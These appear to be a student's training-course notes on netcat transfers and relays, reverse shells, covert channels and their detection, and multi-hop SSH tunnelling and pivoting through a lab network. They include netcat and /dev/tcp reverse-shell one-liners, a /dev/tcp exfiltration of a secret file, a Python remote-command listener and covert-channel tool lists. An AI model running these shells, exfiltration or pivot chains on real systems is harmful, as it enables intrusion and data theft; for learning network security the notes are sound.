Upload a file to a remote directory from a local directory

$ proxychains scp secretstuff.txt student@localhost:
```



## NETCAT Transfer (CMD)

NETCAT: CLIENT TO LISTENER FILE TRANSFER


```
    Listener (receive file):

nc -lvp 9001 > newfile.txt

    Client (sends file):

nc 172.16.82.106 9001 < file.txt
```

NETCAT LISTENER TO CLIENT FILE TRANSFER

```
    Listener (sends file):

nc -lvp 9001 < file.txt

    Client (receive file):

nc 172.16.82.106 9001 > newfile.txt

```


## NETCAT RELAY DEMO (CMD)

**Listener - Listener**
```
    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe

    On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt
```

**Client - Client**
```
    On Internet_Host (send):

$ nc -lvp 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

```


**Client - Listener**
```
    On Internet_Host (send):

$ nc -lvp 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
```


**Listener - Client**
```
    On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```

## NC DEMO 1 WAY (CMD)

```
Listener
nc -lvp 2221 < SStext
Listening on [any] 2221 ...
Can you Hear Me? (1)

Middleman
nc 192.168.1.10 2221 | nc 10.10.0.40 4442
Yes I Can (3)


Client
nc -lvp 4442 > file.txt
Listening on [any] 4442 ...
^C
Yes I can (2)
```

## NC DEMO 2 WAY PIPE on Seperate ENDS (CMD)

```
Listener
nc -lvp 2221
Listening on [any] 2221 ...
Test? (1)

Middleman
mknod MYPIPE p
nc 192.168.1.10 2221 < MYPIPE | nc 10.10.0.40 4442 > MYPIPE

Client
nc -lvp 4442 
Listening on [any] 4442 ...
Yes! (2)
```
## NC DEMO 2 WAY PIPE using MIDDLEMAN (CMD)
```
Middleman
mknod MYPIPE p
nc -lvp 2221 < MYPIPE | nc -lvp 4442 > MYPIPE
Listening [2221] ...
Listening [4442] ...


Client (1)
nc MiddleMANIP 2221


Client (2)
nc MiddleMANIP 4442
```

## File Transfer with /DEV/TCP (CMD)

```
    On the receiving box:

$ nc -lvp 1111 > devtcpfile.txt

    On the sending box:

$ cat secret.txt > /dev/tcp/10.10.0.40/1111

    This method is useful for a host that does not have NETCAT available.
```

## Reverse SHELL Using NC (CMD)
```
    First listen for the shell on your device.

$ nc -lvp 9999

    On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

```

## Reverse SHELL Using /DEV/TCP (CMD)

```
    First listen for the shell on your device.

$ nc -lvp 9999

    On Victim:

$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1

```


## Reverse SHELL PYTHON3 (CMD)

```
#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()

```

## Packing and Encoding

Take information and pack it with different headers, formulas, and ways to obsfuscate information.


Packers - special code added to programs to compress executables to reduces network traffic, obsfucsation, reduce time on target.

Encoding and Decoding, Specialized formatting, used for trasmission and storage, HEX, BASE64, NOT COMPRESSION, ENCAPSULATION, or ENCRYPTION


## XXD (CMD)
```
    echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\

$ echo "Hex encoding test" | xxd -p
48657820656e636f64696e6720746573740a

    echo hex string and use xxd to restore the data to its original format

$ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
Hex encoding test
```


## BASE64 Encoding and Decoding


    binary-to-text encoding

    A-Z, a-z, 1-9, +, /

    6 bits per non-final digit

    (4) 6-bit groups per (3) 8-bit groups

    padding used to fill in any unused space in each 24-bit group


![image](https://github.com/user-attachments/assets/7113ac99-bdd3-4574-80e0-170d2bed1daa)


## TRANSFER FILE USING BASE64 (CMD)

    generate the base64 output of a file, with line wrapping removed

$ base64 -w0 logoCyber.png

    copy the output


    create a new file on your machine

$ nano b64image.png

paste, save & exit

    decode from base64 with -d

$ base64 -d b64image.png > logoCyber.png



# SHH Tunneling and Covert Channels

    Tunneling - Tunneling encapsulates a protocol inside another protocol.

        Encapsulation

        Transmission

        Decapsulation


6 in 4

    Tunnel IPv6 traffic in an IPv4 Generic Routing Encapsulation (GRE) tunnel

    Simple and deterministic

    Must be configured manually

    Commonly used for connecting IPv6 islands over an IPv4 network.

    Uses IP protocol 41

6 to 4

    Allows for IPv6 packets to be sent over an IPv4 network

    Enables automatic tunneling of IPv6 packets over an IPv4 network.

    Uses 6to4 gateways that encapsulate IPv6 packets within IPv4 packets.

    Allows communication between IPv6 networks across IPv4 infrastructure.

    Uses IP protocol 41


## Teredo Tunneling

    RFC 4380

    Allows IPv4 clients to access IPv6 clients

    Encapsulates IPv6 packets within UDP

    Commonly used for devices behind NAT

    Uses the 2001:0000::/32 prefix


## ISATAP

    Allows IPv6 hosts to communicate over an IPv4 network within a site (local network)

    Can be used over the internet for specific site-to-site communications.

    Generates a Link-Local address using its IPv4 address

    192.168.199.99 → FE80::0000:5EFE:c0a8:c763

## Covert Channel 

Taking a common and legitamate protocol to transfer data illegitimately 

Common Channels
	ICMP

 	DNS

  	HTTP

Type of Covert Channels

    Storage

        Payload

        Header

            IP Header (TOS, IP ID, Flags + Fragmentation, and Options)

            TCP Header (Reserved, URG Pointer, and Options)
    Timing

        Modifying transmission of legitimate traffic

        Delaying packets between nodes

        Watch TTL changes

        Watch for variances between transmissions

## How to detect COVERT CHANNELS

    Host Analysis

        Requires knowledge of each applications expected behavior.

    Network Analysis

        A good understanding of your network and the common network protocols being used is the key

    Baselining of what is normal to detect what is abnormal

## DETECT COVERT CHANNELS ICMP

    ICMP works with one request and one reply answer

        Type 8 code 0 request

        Type 0 code 0 answer

    Check for:

        Payload imbalance

        Request/responce imbalance

        Large payloads in response

 ICMP Covert Channel Tools

    ptunnel

    Loki

    007shell

    ICMP Backdoor

    B0CK

    Hans


## DETECT COVERT CHANNELS ICMP

    DNS is a request/response protocol

    1 request typically gets 1 response

    Payloads generally do no exceed 512 bytes

    Check for:

        Request/response imbalances

        Unusual payloads

        Burstiness or continuous use


DNS Covert Channel Tools

    OzymanDNS

    NSTX

    dns2tcp

    iodine

    heyoka

    dnscat2


## DETECT COVERT CHANNELS HTTP



    Request/Response protocol to pull web content

    GET request may include .png, .exe, .(anything) files

    Can vary in sizes of payloads

    Typically "bursty" but not steady


HTTP Covert Channel Tools

    tunnelshell tools

    HTTPTunnel

    SirTunnel

    go HTTP tunnel



## STEGANOGRAPHY

    Hiding messages inside legitimate information objects

        Methods:

            Injection

            Substitution

            Propagation

Steganography Injection

    Done by inserting message into the unused (whitespace) of the file, usually in a graphic

    Second most common method

    Adds size to the file

    Hard to detect unless you have original file

    tools:

        StegHide


Steganography Propagation

    Generates a new file entirely

    Needs special software to manipulate file

        tools:

            StegSecret

            HyDEn

            Spammimic



## SSH 

Configuration Files

    Client Configuration File (/etc/ssh/ssh_config)

    Server Configuration File (/etc/ssh/sshd_config)

    Known Hosts File (~/.ssh/known_hosts)

Client vs Server vs Session

User Key Asymmetric

Host Key Asymmetric

Session Key Symmetric

![image](https://github.com/user-attachments/assets/198f211c-8481-4dad-bbce-9b7abb3d43e3)


SSH Host key Changed
 

ssh student@172.16.82.106
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:RO05vd7h1qmMmBum2IPgR8laxrkKmgPxuXPzMpfviNQ.
Please contact your system administrator.
Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/student/.ssh/known_hosts:1
remove with:
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
ECDSA host key for 172.16.82.106 has changed and you have requested strict checking.
Host key verification failed.


SSH Key Change Fix

ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"

    Copy/Paste the ssh-geygen message to remove the Host key from the known_hosts file






## SSH Port Forwarding 

Go to a new port



    -L - Creates a port on the client mapped to a ip:port via the server (LOCAL) (IM OPENING THIS PORT ON MY DEVICE)

    -D - Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically (POINT TO A PLACE BOUND LOCALLY)

    -R - Creates the port on the server mapped to a ip:port via the client (REMOTE) (OPEN PORT ON REMOTE DEVICE) 

    -NT - Do not execute a remote command and disable pseudo-tty (will hang window) 



## LOCAL PORT FORWARDING


ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port> -NT

ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT


1. MUST SSH TO BOX

2. 



## Local Port Forward to localhost of server (SSH) (CMD)
      
Internet_Host:
ssh student@172.16.1.15 -L 1122:localhost:22
or
ssh -L 1122:localhost:22 student@172.16.1.15

Internet_Host:
ssh student@localhost -p 1122
Blue_DMZ_Host-1~$

## Local Port Forward to localhost of server (TELNET) (CMD)

Internet_Host:
ssh student@172.16.1.15 -L 1123:localhost:23
or
ssh -L 1123:localhost:23 student@172.16.1.15

Internet_Host:
telnet localhost 1123
Blue_DMZ_Host-1~$

## Local Port Forward to localhost of server (HTTP) (CMD)

Internet_Host:
ssh student@172.16.1.15 -L 1180:localhost:80
or
ssh -L 1180:localhost:80 student@172.16.1.15

Internet_Host:
firefox http://localhost:1180
{Webpage of Blue_DMZ_Host-1}

## Local Port Forward to remote target via server (CMD) 

Internet_Host:
ssh student@172.16.1.15 -L 2222:172.16.40.10:22
or
ssh -L 2222:172.16.40.10:22 student@172.16.1.15

Internet_Host:
ssh student@localhost -p 2222
Blue_INT_DMZ_Host-1~$

## Local Port Forward to remote target via server (TELNET) (CMD) 

Internet_Host:
ssh student@172.16.1.15 -L 2223:172.16.40.10:23
or
ssh -L 2223:172.16.40.10:23 student@172.16.1.15

Internet_Host:
telnet localhost 2223
Blue_INT_DMZ_Host-1~$

## Local Port Forward to remote target via server (HTTP) (CMD) 

Internet_Host:
ssh student@172.16.1.15 -L 2280:172.16.40.10:80
or
ssh -L 2280:172.16.40.10:80 student@172.16.1.15

Internet_Host:
firefox http://localhost:2280
{Webpage of Blue_INT_DMZ_Host-1}




## FORWARD THROUGH TUNNEL

Internet_Host:
ssh student@172.16.1.15 -L 2222:172.16.40.10:22
ssh student@localhost -p 2222 -L 3322:172.16.82.106:22

Internet_Host:
ssh student@localhost -p 3322
Blue_Host-1~$



Internet_Host:
ssh student@172.16.1.15 -L 2222:172.16.40.10:22
ssh student@localhost -p 2222 -L 3323:172.16.82.106:23

Internet_Host:
telnet localhost 3323
Blue_Host-1~$



Internet_Host:
ssh student@172.16.1.15 -L 2222:172.16.40.10:22
ssh student@localhost -p 2222 -L 3380:172.16.82.106:80

Internet_Host:
firefox http://localhost:3380
{Webpage of Blue_Host-1}


## DYNAMIC PORT FOWARDING

Internet_Host:
ssh student@172.16.1.15 -L 2222:172.16.40.10:22
or
ssh -L 2222:172.16.40.10:22 student@172.16.1.15

Internet_Host:
ssh student@localhost -p 2222 -D 9050
or
ssh -D 9050 student@localhost -p 2222


1 Step

Internet_Host:
proxychains ./scan.sh
proxychains nmap -Pn 172.16.82.96/27 -p 21-23,80
proxychains ssh student@172.16.82.106
proxychains telnet 172.16.82.106
proxychains wget -r http://172.16.82.106
proxychains wget -r ftp://172.16.82.106


## REMOTE PORT FORWARDING

ssh -p <optional alt port> <user>@<server ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT

or

ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT



## REMOTE PORT FORWARDING FROM LOCAL HOST OF CLIENT

Blue_DMZ_Host-1:
ssh student@10.10.0.40 -R 4422:localhost:22
or
ssh -R 4422:localhost:22 student@10.10.0.40


Internet_Host:
ssh student@localhost -p 4422
Blue_DMZ_Host-1~$




Blue_DMZ_Host-1:
ssh student@10.10.0.40 -R 4423:localhost:23
or
ssh -R 4423:localhost:23 student@10.10.0.40

Internet_Host:
telnet localhost 4423
Blue_DMZ_Host-1~$



Blue_DMZ_Host-1:
ssh student@10.10.0.40 -R 4480:localhost:80
or
ssh -R 4480:localhost:80 student@10.10.0.40

Internet_Host:
firefox http://localhost:4480
{Webpage of Blue_DMZ_Host-1}


## REMOTE PORT FORWARDING FROM TO REMOTE TARGET VIA CLIENT

Blue_DMZ_Host-1:
ssh student@10.10.0.40 -R 5522:172.16.40.10:22
or
ssh -R 5522:172.16.40.10:22 student@10.10.0.40

Internet_Host:
ssh student@localhost -p 5522
Blue_INT_DMZ_Host-1~$



Blue_DMZ_Host-1:
ssh student@10.10.0.40 -R 5523:172.16.40.10:23
or
ssh -R 5523:172.16.40.10:23 student@10.10.0.40

Internet_Host:
telnet localhost 5523
Blue_INT_DMZ_Host-1~$



Blue_DMZ_Host-1:
ssh student@10.10.0.40 -R 5580:172.16.40.10:80
or
ssh -R 5580:172.16.40.10:80 student@10.10.0.40

Internet_Host:
firefox http://localhost:5580
{Webpage of Blue_INT_DMZ_Host-1}











## BRIDGING LOCAL AND REMOTE PORT FORWARDING

ssh user@1.2.3.4 -L 1234:1.2.3.4:23

IH> telnet localhost 1234

.10: ssh user@.15 -R 8080:127.0.0.1:22




Internet_Host:
ssh student@172.16.1.15 -L 2223:172.16.40.10:23 -NT
or
ssh -L 2223:172.16.40.10:23 student@172.16.1.15 -NT

Internet_Host:
telnet localhost 2223
Blue_INT_DMZ_Host-1~$


Internet_Host:
ssh student@localhost -p 2222 -D 9050
or
ssh -D 9050 student@localhost -p 2222


Internet_Host:
proxychains ./scan.sh
proxychains nmap -Pn -sT 172.16.82.96/27 -p 21-23,80
proxychains ssh student@172.16.82.106
proxychains telnet 172.16.82.106
proxychains wget -r http://172.16.82.106
proxychains wget -r ftp://172.16.82.106


# SSH Practice (CMD)



## First Pivot External Active Recon

tp2

internet_host$ ./scan.sh

    Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

        If HTTP ports are open we can use wget, curl, or a web-browser like firefox to interact with it. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

            wget -r http://10.50.x.x or wget -r port

            curl http://10.50.x.x or curl port

            firefox 10.50.x.x or `firefox 10.50.x.x:[port]

        If FTP port is open we can use wget, curl or ftp to interact with it.

            wget -r ftp://10.50.x.x

            curl ftp://10.50.x.x or curl ftp://10.50.x.x/file

            ftp 10.50.x.x

        If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

            nc 10.50.x.x [port]

            telnet 10.50.x.x or telnet 10.50.x.x [port]

            ssh [username]@10.50.x.x or ssh [username]@10.50.x.x -p [port]



    Upon access to the remote system you can perform passive enumeration.

        We can identify the hostname by examining the prompt or by running the hostname command.

        ip address or ifconfig or ipconfig to gather the internal ip address and CIDR. These together will allow you to determine the usable ip range of the internal network. This will also allow us to see any additional networks the system may be connected to.

        ip neighbor or arp -a to gather information about other possible devices on the network. This will only give you details about devices that the system has communicated with recently.

        ss -antlp or netstat -antlp to gather information about other listening service ports on the system. This may differ from your active scans as firewalls can limit the ports you are able to view from remote.

        ps -elf to check for running processes on the system. This will give you alot of information so grepping for specific services may be required.

        find / -iname [filename] 2>/dev/null can be used to look for interesting files on the system.

        `ls /usr/share/cctc' to determine if any artifacts of interest are in the share directory.

        To pull any files found:

            internet_host$ scp john@10.50.x.x:/usr/share/cctc/john.png .


## Scan second pivot

Second Pivot External Active Recon

tp4

internet_host$ ssh john@[float ip] -D 9050 -NT
internet_host$ proxychains ./scan.sh

    To enumerate the system beyond our first pivot we establish a Dynamic tunnel (-D) on port 9050 to John who is our first pivot and proxy.

    We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

    Thru the scans we find other systems on the network by their IP address and the service ports on them.

    Here we discover the host Jack (104.16.181.15) and it has SSH running on port 22.

    Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

        If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

            proxychains wget -r http://104.16.181.15 or proxychains wget -r port

            proxychains curl http://104.16.181.15` or `proxychains curl port

        If FTP port is open we can use wget, curl or ftp to interact with it.

            proxychains wget -r ftp://104.16.181.15

            proxychains curl ftp://104.16.181.15 or proxychains curl ftp://104.16.181.15/file

            proxychains ftp 104.16.181.15 and switch to passive mode.

        If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

            proxychains nc 104.16.181.15 [port]

            proxychains telnet 104.16.181.15 or proxychains telnet 104.16.181.15 [port]

            proxychains ssh [username]@104.16.181.15 or proxychains ssh [username]@104.16.181.15 -p [port]




internet_host$ proxychains ssh jack@104.16.181.15

    Here you can perform the same passive recon steps as before.

    To pull any files from Jack:

        internet_host$ proxychains scp jack@104.16.181.15:/usr/share/cctc/jack.png .



##  Scan third pivot

Third Pivot External Active Recon

tp6

<close the previous dynamic tunnel>
internet_host$ ssh john@[float ip] -L 1111:104.16.181.15:22 -NT
internet_host$ ssh jack@localhost -p 1111 -D 9050 -NT
internet_host$ proxychains ./scan.sh

    To enumerate beyond Jack we must close the dynamic tunnel to John.

    We use John as our pivot to setup a local-port-forward (1111) to Jack targeting Jack’s ssh port (22).

    We then setup a new dynamic tunnel to Jack (1111).

        We are able to authenticate to Jack by calling the localhost -p 1111 which is the tunnel we setup that targets Jack’s ssh port.

    We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

    Thru the scans we find other systems on the network by their IP address and the service ports on them.

    Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

        If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the [ip]:[port] to interact with it.

            proxychains wget -r http://142.16.8.32 or proxychains wget -r port

            proxychains curl http://142.16.8.32 or proxychains curl port

        If FTP port is open we can use wget, curl or ftp to interact with it.

            proxychains wget -r ftp://142.16.8.32

            proxychains curl ftp://142.16.8.32 or proxychains curl ftp://142.16.8.32/file

            proxychains ftp 142.16.8.32 and switch to passive mode.

        If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

            proxychains nc 142.16.8.32 [port]

            proxychains telnet 142.16.8.32 or proxychains telnet 142.16.8.32 [port]

            proxychains ssh [username]@142.16.8.32 or proxychains ssh [username]@142.16.8.32 -p [port]

    Here we discover the host Bill (142.16.8.32) and it has SSH running on port 4567.




internet_host$ proxychains ssh bill@142.16.8.32 -p 4567

    Here you can perform the same passive recon steps as before.

    To pull any files from Bill:

        internet_host$ proxychains scp -P 4567 bill@142.16.8.32:/usr/share/cctc/bill.png .



## Scan forth pivot

Forth Pivot External Active Recon

tp8

<close the previous dynamic tunnel>
internet_host$ ssh jack@localhost -p 1111 -L 2222:142.16.8.32:4567 -NT
internet_host$ ssh bill@localhost -p 2222 -D 9050 -NT
internet_host$ proxychains ./scan.sh

    To enumerate beyond Bill we must close the dynamic tunnel to Jack.

    We use Jack as our pivot (1111) to setup a local-port-forward (2222) to Bill targeting Bill’s ssh port (4567).

    We then setup a new dynamic tunnel to Bill (2222).

        We are able to authenticate to Bill by calling the localhost -p 2222 which is the tunnel we setup that targets Bill’s ssh port.

    We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

    Thru the scans we find other systems on the network by their IP address and the service ports on them.

    Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

        If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

            proxychains wget -r http://155.39.88.21 or proxychains wget -r port

            proxychains curl http://155.39.88.21 or proxychains curl port

        If FTP port is open we can use wget, curl or ftp to interact with it.

            proxychains wget -r ftp://155.39.88.21

            proxychains curl ftp://155.39.88.21 or proxychains curl ftp://155.39.88.21/file

            proxychains ftp 155.39.88.21 and switch to passive mode.

        If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

            proxychains nc 155.39.88.21 [port]

            proxychains telnet 155.39.88.21 or proxychains telnet 155.39.88.21 [port]

            proxychains ssh [username]@155.39.88.21 or proxychains ssh [username]@155.39.88.21 -p [port]

    Here we discover the host Brian (155.39.88.21) and it does NOT seem to have an SSH port but it does have Telnet open on port 23.




internet_host$ proxychains telnet 155.39.88.21

    Here you can perform the same passive recon steps as before.

    We are not able to extract any files thru our telnet connection. We need to determine if we can establish an remote ssh connection first by determining if SSH is running on the system



## Scan fifth pivot

Fifth Pivot External Active Recon

tp9

<close the previous dynamic tunnel>
internet_host$ ssh bill@localhost -p 2222 -L 3333:155.39.88.21:23 -NT
internet_host$ telnet localhost 3333
brian$ ssh bill@155.39.88.17 -p 4567 -R 4444:localhost:22 -NT
internet_host$ ssh bill@localhost -p 2222 -L 5555:localhost:4444 -NT
internet_host$ ssh brian@localhost -p 5555 -D 9050 -NT
internet_host$ proxychains ./scan.sh

    To enumerate beyond Brian we must close the dynamic tunnel to Bill.

    We use Bill as our pivot (2222) to setup a local-port-forward (3333) to Brian targeting Brian’s telnet port (23).

    We then telnet to the local port 3333. This will allow us to telnet to Brian.

    On Brian we ssh to Bill on his ssh port (4567) and setup a remote-port-forward by creating (4444) on Bill that is mapped to Brian’s localhost:22.

    We then use Bill as our pivot (2222) to setup a local-port-forward (5555) to Bill’s own localhost:4444. 4444 is the port we create on Bill using the remote-port-forward from Brian.

    We then setup a new dynamic tunnel to Brian (5555).

        We are able to authenticate to Brian by calling the localhost -p 5555 which is the tunnel we setup that targets Brian’s ssh port.

    We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

    Thru the scans we find other systems on the network by their IP address and the service ports on them.

    Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

        If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

            proxychains wget -r http://150.21.99.8 or proxychains wget -r port

            proxychains curl http://150.21.99.8 or proxychains curl port

        If FTP port is open we can use wget, curl or ftp to interact with it.

            proxychains wget -r ftp://150.21.99.8

            proxychains curl ftp://150.21.99.8 or proxychains curl ftp://150.21.99.8/file

            proxychains ftp 150.21.99.8 and switch to passive mode.

        If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

            proxychains nc 150.21.99.8 [port]

            proxychains telnet 150.21.99.8 or proxychains telnet 150.21.99.8 [port]

            proxychains ssh [username]@150.21.99.8 or proxychains ssh [username]@150.21.99.8 -p [port]

    To pull any files from Brian:

        internet_host$ proxychains scp brian@localhost:/usr/share/cctc/brian.png .

            We use localhost because our proxy is Brian himself.

    Here we discover the host Bob (150.21.99.8) and it has SSH running on port 6789.





internet_host$ proxychains ssh bob@@150.21.99.8 -p 6789

    Here you can perform the same passive recon steps as before.

    To pull any files from Bob:

        internet_host$ proxychains scp -P 6789 bob@150.21.99.8:/usr/share/cctc/bob.png .


## Scan sixth pivot

Sixth Pivot External Active Recon

tp12

<close the previous dynamic tunnel>
internet_host$ ssh ssh brian@localhost -p 5555 -L 6666:150.21.99.8:6789 -NT
internet_host$ ssh bob@localhost -p 6666 -D 9050 -NT
internet_host$ proxychains ./scan.sh

    To enumerate beyond Bob we must close the dynamic tunnel to Brian.

    We use Brian as our pivot (5555) to setup a local-port-forward (6666) to Bob targeting Bob’s ssh port (6789).

    We then setup a new dynamic tunnel to Bob (6666).

        We are able to authenticate to Bob by calling the localhost -p 6666 which is the tunnel we setup that targets Bob’s ssh port.

    We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

    Thru the scans we find other systems on the network by their IP address and the service ports on them.

    Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

        If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

            proxychains wget -r http://201.10.101.11 or proxychains wget -r port

            proxychains curl http://201.10.101.11 or proxychains curl port

        If FTP port is open we can use wget, curl or ftp to interact with it.

            proxychains wget -r ftp://201.10.101.11

            proxychains curl ftp://201.10.101.11 or proxychains curl ftp://201.10.101.11/file

            proxychains ftp 201.10.101.11 and switch to passive mode.

        If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

            proxychains nc 201.10.101.11 [port]

            proxychains telnet 201.10.101.11 or proxychains telnet 201.10.101.11 [port]

            proxychains ssh [username]@201.10.101.11 or proxychains ssh [username]@201.10.101.11 -p [port]

    Here we discover the host Jill (201.10.101.11) and it does NOT seem to have an SSH port but it does have Telnet open on port 23.





internet_host$ proxychains telnet 201.10.101.11

    Here you can perform the same passive recon steps as before.

    We are not able to extract any files thru our telnet connection. We need to determine if we can establish an remote ssh connection first by determining if SSH is running on the system.



## Scan seventh pivot

Seventh Pivot External Active Recon

tp14

<close the previous dynamic tunnel>
internet_host$ ssh bob@localhost -p 6666 -L 7777:201.10.101.11:23 -NT
internet_host$ telnet localhost 7777
jill$ ssh bob@201.10.101.10 -p 6789 -R 8888:localhost:9876 -NT
internet_host$ ssh bob@localhost -p 6666 -L 9999:localhost:8888 -NT
internet_host$ ssh jill@localhost -p 9999 -D 9050 -NT
internet_host$ proxychains ./scan.sh

    To enumerate beyond Jill we must close the dynamic tunnel to Bob.

    We use Bob as our pivot (6666) to setup a local-port-forward (7777) to Brian targeting Jill’s telnet port (23).

    We then telnet to the local port 7777. This will allow us to telnet to Jill.

    On Jill we ssh to Bob on his ssh port (6789) and setup a remote-port-forward by creating (8888) on Bob that is mapped to Jill’s localhost:9876.

    We then use Bob as our pivot (6666) to setup a local-port-forward (9999) to Bob’s own localhost:8888. 8888 is the port we create on Bob using the remote-port-forward from Jill.

    We then setup a new dynamic tunnel to Jill (9999).

        We are able to authenticate to Jill by calling the localhost -p 9999 which is the tunnel we setup that targets Jill’s ssh port.

    We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

    Thru the scans we find other systems on the network by their IP address and the service ports on them.

    Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

        If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it

            proxychains wget -r http://52.20.180.148 or proxychains wget -r port

            proxychains curl http://52.20.180.148 or proxychains curl port

        If FTP port is open we can use wget, curl or ftp to interact with it.

            proxychains wget -r ftp://52.20.180.148

            proxychains curl ftp://52.20.180.148 or proxychains curl ftp://52.20.180.148/file

            proxychains ftp 52.20.180.148 and switch to passive mode.

        If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

            proxychains nc 52.20.180.148 [port]

            proxychains telnet 52.20.180.148 or proxychains telnet 52.20.180.148 [port]

            proxychains ssh [username]@52.20.180.148 or proxychains ssh [username]@52.20.180.148 -p [port]

    To pull any files from Jill:

        internet_host$ proxychains scp jill@localhost:/usr/share/cctc/jill.png .

            We use localhost because our proxy is Jill herself.

    Here we discover the host espn (52.20.180.148) and it has no ssh or telnet service running.


![image](https://github.com/user-attachments/assets/af54d498-7805-4d28-a52f-da2c9608ad89)


# Tunnels
## Tunnel Syntax (CMD)

L/D - ALWAYS FROM IH [A] going deeper
R - ALWAYS OFF BOX w/ HIDDEN SERVICE coming back

1. target
2. who can see target
3. tunnel type
4. RHP

2 COMMANDS For Tunnels
1. Authentication
2. Tunnel


LOCAL 
```
[A]:> ssh student@[B] -L 1111:[C]:23 -NT

[A] ssh to [B] using RHP 1111 to reach [C] on port 23

[A] > telnet 172.0.0.1 1111
```


REMOTE 
```
[C]:> ssh student@[b] -R 2222:[c]:22 -NT

[C] has a service that is being opened via [2222] that goes to [C] port 22

[A]:> ssh@[B] -L 3333:127.0.0.1:2222

[A]:> ssh student@localhost -p 3333 -D 9050 -NT

```

WHO YOU RUN THE COMMAND ON IS WHO OPENS RHP.

WHO YOU AUTH TO HAS THE SERVICE



DYNAMIC TUNNEL

A:> ssh student@localhost -p 3333 -D 9050 -NT

DO NOT PROXYCHAINS telnet or SSH



![image](https://github.com/user-attachments/assets/8b3a135d-31e6-40c6-9c44-eafdd7d4aade)


![image](https://github.com/user-attachments/assets/9da1aaa7-7e0b-4041-b174-e4a24a8e836d)





## RICK AND MORTY

IH --> TELNET TO A (DOESNT HAVE 22 open since firewall)
telnet 10.50.25.56

A:> ssh student@[IH IP] -R 10901:127.0.0.1:22 
will allow use to ssh to [A] pass firewall using
ssh net1_student9@127.0.0.1 -p 10901

 IH 10901 ---> [A] 22

 Using tunnel we SSH from [A] to [B] using SSHD -p 2222
